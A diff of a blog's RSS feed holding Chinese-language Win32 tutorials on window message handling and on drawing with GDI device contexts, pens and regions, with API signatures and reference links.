&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;118&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; WM_LBUTTONDOWN&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;119&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;120&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;121&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;122&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WM_LBUTTONDOWN %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;123&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;124&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			POINTS points &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;MAKEPOINTS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;125&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;126&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WM_LBUTTONDOWN %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;points&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;points&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;127&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;128&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;129&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;130&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;131&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;132&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//default:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;133&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//       return DefWindowProc (hWnd, message, wParam, lParam);// 扔给 windows 处理其他消息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;134&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;135&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;136&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;DefWindowProc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hwnd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;uMsg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 扔给 windows 处理其他消息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;137&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;138&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;MFC 就是基于此封装&lt;/p&gt;
+&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
+&lt;p&gt;滴水逆向课件&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaUJpbmFyeS9wLzk1ODAyNjguaHRtbA==&#34;&gt; https://www.cnblogs.com/iBinary/p/9580268.html&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RmZzA4MjMvYXJ0aWNsZS9kZXRhaWxzLzEwMTk2NDQyMw==&#34;&gt;https://blog.csdn.net/dfg0823/article/details/101964423&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1p6MjIzMzMvYXJ0aWNsZS9kZXRhaWxzLzg5MDg0NTYy&#34;&gt;https://blog.csdn.net/Zz22333/article/details/89084562&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://self-ferry.github.io/2021/07/05/Win%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%AC%E8%B4%A8/</guid>
+            <title>Win窗口的本质</title>
+            <link>https://self-ferry.github.io/2021/07/05/Win%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%AC%E8%B4%A8/</link>
+            <category term="Win32编程" scheme="https://self-ferry.github.io/categories/Win32%E7%BC%96%E7%A8%8B/" />
+            <category term="设备对象" scheme="https://self-ferry.github.io/tags/%E8%AE%BE%E5%A4%87%E5%AF%B9%E8%B1%A1/" />
+            <category term="DC设备上下文" scheme="https://self-ferry.github.io/tags/DC%E8%AE%BE%E5%A4%87%E4%B8%8A%E4%B8%8B%E6%96%87/" />
+            <category term="图形对象" scheme="https://self-ferry.github.io/tags/%E5%9B%BE%E5%BD%A2%E5%AF%B9%E8%B1%A1/" />
+            <pubDate>Mon, 05 Jul 2021 20:57:58 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;窗口的本质&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#窗口的本质&#34;&gt;#&lt;/a&gt; 窗口的本质&lt;/h1&gt;
+&lt;p&gt;在学习 Win32 的时候。很多操作都是窗口进行操作的。那么今天就说一下窗口的本质是什么.&lt;/p&gt;
+&lt;p&gt;窗口的本质是不断绘制。是 windows 通过消息机制进行绘制的.&lt;/p&gt;
+&lt;p&gt;我们知道。内存分为高低 2G 低 2G 是给应用程序使用的。高 2G 是给操作系统使用的。而我们画图形的操作都是操作系统通过底层的 win32k.sys 这个驱动来提供的.&lt;/p&gt;
+&lt;p&gt;进程跟线程管理是通过 notokerner.exe 这个程序来管理的。但是三环不能使用。所以提供接口给三环。分别是 kerner32.dll 跟 user32.dll gdi.dll&lt;/p&gt;
+&lt;p&gt;那么他们之间的区别是什么.&lt;/p&gt;
+&lt;p&gt;1.kerner32.dll  管理进程线程跟内存的一个 dll&lt;/p&gt;
+&lt;p&gt;2.user32.dll   窗口管理。图形界面管理.&lt;/p&gt;
+&lt;p&gt;3.gdi.dll         自己绘制的的管理.&lt;/p&gt;
+&lt;p&gt;而我们要认识一下窗口的创建。那么需要了解几个基础的只是.&lt;/p&gt;
+&lt;p&gt;1. 设备对象.&lt;/p&gt;
+&lt;p&gt;2.DC 设备上下文.&lt;/p&gt;
+&lt;p&gt;3. 图形对象.&lt;/p&gt;
+&lt;h2 id=&#34;设备对象是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#设备对象是什么&#34;&gt;#&lt;/a&gt; 设备对象是什么&lt;/h2&gt;
+&lt;p&gt;简而言之设备对象的意思就是你要画图形要往哪里画。每一个窗口都有一个窗口句柄。而且是存放在全局窗口句柄表中的。我们可以获取一下。使用 Spy++ 获取.&lt;/p&gt;
+&lt;h2 id=&#34;dc设备上下文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dc设备上下文&#34;&gt;#&lt;/a&gt; DC 设备上下文.&lt;/h2&gt;
+&lt;p&gt;DC 设备上下文其实就是这个窗口有一块内存是绘制用的。我们想要往这个窗口绘制。需要先绘制到这个内存中才可以。这块内存就称为 DC 上下文.&lt;/p&gt;
+&lt;h2 id=&#34;图形对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#图形对象&#34;&gt;#&lt;/a&gt; 图形对象.&lt;/h2&gt;
+&lt;p&gt;图形对象就是指画笔 画刷 位图。等等这些对象。因为我们要往内存中画的时候。可以画默认的。但是一般我们想改变一下形式。所以创建图形对象跟 DC 相关联。那么我们绘制就可以使用图形对象了.&lt;/p&gt;
+&lt;h1 id=&#34;绘制窗口步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绘制窗口步骤&#34;&gt;#&lt;/a&gt; 绘制窗口步骤&lt;/h1&gt;
+&lt;p&gt;绘制窗口免不了使用 API. 但是使用之前。需要知道我们要操作的步骤.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;获取窗口句柄。也就是设备对象.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;获取窗口中的 DC 上下文。可以理解为获取指定窗口的绘图的那块内存.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;创建图形对象。要想绘制。那么首先就需要你自定义的一个绘制的东西才可以.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;关联图形对象跟 DC. 只要关联了。那么绘制的时候自动就使用你的图形对象了.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;进行你的绘图操作。这里就是你写的绘图代码了.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;释放资源。不管是窗口句柄也好. DC 也好。图形对象也好。都是内核对象。所以我们需要进行释放.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;具体api&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#具体api&#34;&gt;#&lt;/a&gt; 具体 API&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;获取指定窗口句柄   &lt;code&gt;FindWindowA/FindWindowW&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HWND &lt;span class=&#34;token function&#34;&gt;FindWindowA&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  LPCSTR lpClassName&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;              窗口类名&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;字符串&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt; 可以用Spy&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;获取&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  LPCSTR lpWindowName           窗口名称&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;返回窗口句柄&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;获取 DC 设备上下文  &lt;code&gt;GetDc()&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HDC &lt;span class=&#34;token function&#34;&gt;GetDC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  HWND hWnd                    传入设备对象&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;也就是窗口句柄&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;创建图形对象&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;PS: 创建图形对象。图形对象有很多。有画笔。画刷。等等.&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HPEN &lt;span class=&#34;token function&#34;&gt;CreatePen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;      iStyle&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;              &lt;span class=&#34;token comment&#34;&gt;// 创建笔的风格，意思就是你的画笔是实心的 还是虚线 还是其他.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;      cWidth&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;              &lt;span class=&#34;token comment&#34;&gt;// 笔的宽度。如果实心的。笔的宽度则自定义设置。如果其他。不能超过 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  COLORREF color                &lt;span class=&#34;token comment&#34;&gt;//RGB 的颜色。你的画笔是什么颜色的。是一串 16 进制可以在线取色&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;返回图形对象&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;还有常用的。创建矩形区域.&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HRGN &lt;span class=&#34;token function&#34;&gt;CreateRectRgn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; x1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; y1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                 &lt;span class=&#34;token comment&#34;&gt;// 坐标&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; x2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; y2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;具体使用可以查询 MSDN:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy9kZXNrdG9wL2dkaS93aW5kb3dzLWdkaQ==&#34;&gt;https://docs.microsoft.com/zh-cn/windows/desktop/gdi/windows-gdi&lt;/span&gt; 代码使用例子&lt;br /&gt;
+如果你安装了 MSDN 2001 版本。搜索 SelectObject 可以看到。图形对象有很多。并且告诉你相应的 API&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Bitmap  位图。后面是操作的 API&lt;/p&gt;
+&lt;p&gt;Brush     画刷&lt;/p&gt;
+&lt;p&gt;字体&lt;/p&gt;
+&lt;p&gt;笔&lt;/p&gt;
+&lt;p&gt;矩形&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;关联 DC 跟图形对象&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HGDIOBJ &lt;span class=&#34;token function&#34;&gt;SelectObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;  HDC hdc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;          &lt;span class=&#34;token comment&#34;&gt;// handle to DC&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HGDIOBJ hgdiobj   &lt;span class=&#34;token comment&#34;&gt;// handle to object);&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;写你想要绘制的代码&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这里如果是画线。则用  &lt;code&gt;LineTo(Hdc,x,y)&lt;/code&gt;  这个 API  给定一个 DC. 给个 x y 坐标。则可以绘制.&lt;/p&gt;
+&lt;p&gt;当然如果指定在哪里开始绘制则用 &lt;code&gt;MoveToEx&lt;/code&gt;  指定起始位置.&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;BOOL &lt;span class=&#34;token function&#34;&gt;MoveToEx&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  HDC     hdc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;     x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;     y&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  LPPOINT lppt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;释放资源&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;释放资源很简单了，如果是图形对象，同一使用 &lt;code&gt;DeleteObject(对象)&lt;/code&gt;  进行删除.&lt;/p&gt;
+&lt;p&gt;如果是 &lt;code&gt;DC&lt;/code&gt; , 如果是创建的 &lt;code&gt;DC&lt;/code&gt; , 则用 &lt;code&gt;DeleteDc(DC对象)&lt;/code&gt;  来进行删除.&lt;/p&gt;
+&lt;p&gt;如果是获取的 &lt;code&gt;DC&lt;/code&gt;  则用 &lt;code&gt;ReleaseDc(Dc对象)&lt;/code&gt;  来进行删除.&lt;/p&gt;
+&lt;p&gt;题外话 windows 程序中还有一个 API. 可以获取 DC 中默认的图形对象.&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 该函数检索预定义的备用笔、刷子、字体或者调色板的句柄&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HGDIOBJ &lt;span class=&#34;token function&#34;&gt;GetStockObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;  fnObject                  &lt;span class=&#34;token comment&#34;&gt;// 对象的类型。你想从 DC 中获取什么对象类型.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;详情见百科&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9HZXRTdG9ja09iamVjdA==&#34;&gt; https://baike.baidu.com/item/GetStockObject&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;图像类型如果是 &lt;code&gt;DC_BRUSH&lt;/code&gt;  则是获取纯色刷。就不用自己创建色刷了。可以通过操作色刷的 API 进行操作.&lt;/p&gt;
